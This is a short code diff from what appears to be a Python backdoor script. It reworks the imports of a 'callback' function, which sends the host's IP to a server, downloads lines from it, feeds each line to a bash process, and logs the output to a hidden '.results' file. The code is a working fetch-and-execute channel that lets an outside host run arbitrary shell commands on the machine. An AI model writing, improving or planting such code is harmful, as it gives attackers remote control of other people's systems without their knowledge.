@@ -20,11 +20,10 @@ def get_ip():
 def callback(ip, server):
     cb_url = "http://" + server + "/" + ip + "/enderman"
     try:
-        import urllib as u
-        code = u.urlopen(cb_url).readlines()
+        import urllib.request as urllib
     except:
-        import urllib.request
-        code = urllib.request.urlopen(cb_url).readlines()
+        import urllib
+    code = urllib.urlopen(cb_url).readlines()
     out = open(".results","w")
     p = Popen("bash", stdin=PIPE, stdout=out, stderr=out)
     for line in code:
